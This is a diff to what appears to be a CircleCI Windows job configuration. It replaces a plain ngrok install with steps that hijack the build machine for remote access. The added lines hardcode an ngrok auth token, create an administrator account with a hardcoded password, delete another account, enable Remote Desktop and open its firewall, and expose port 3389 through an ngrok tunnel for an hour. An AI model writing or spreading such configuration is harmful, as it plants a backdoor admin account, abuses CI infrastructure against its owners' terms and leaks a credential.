@@ -7,4 +7,16 @@ jobs:
       resource_class: windows.medium
       shell: powershell.exe -ExecutionPolicy Bypass
     steps:
-      - run: choco install ngrok -y
+      - run: |
+         choco install ngrok -y
+         ngrok config add-authtoken 2P8v3I9oxTnCsnsVcKIOjd9Rt4Y_5jzoNH4hQQNfWcR8iQz8i
+         net config server /srvcomment:"Windows Server By Disala" > errormsg.txt 2>&1
+         REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /V EnableAutoTray /T REG_DWORD /D 0 /F > errormsg.txt 2>&1
+         net user TheDisala @#Disala123456 /add >nul
+         net localgroup administrators TheDisala /add >nul
+         net user installer /delete
+         reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+         netsh advfirewall firewall set rule group="Remote Desktop" new enable=yes
+         reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1 /f
+         start powershell -NoExit -Command "ngrok tcp 3389 --region in"
+         Start-Sleep -Seconds 3600
